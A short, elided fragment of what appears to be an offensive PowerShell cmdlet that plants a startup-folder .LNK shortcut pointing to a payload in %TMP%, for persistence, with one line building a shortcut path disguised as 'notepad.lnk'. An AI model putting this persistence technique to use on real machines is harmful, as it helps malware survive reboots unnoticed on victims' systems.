...
.DESCRIPTION
   ...
   THis cmdlet can be used to create one .LNK file on target startup
   folder that points to our payload.exe|.bat|.ps1 stored on %TMP% 
...
$FinalName = "$shortcut"+"\$RawTargetName.lnk" -Join '' # C:\Users\pedro\AppData\Roaming\Microsoft\Windows\...\...\...\notepad.lnk
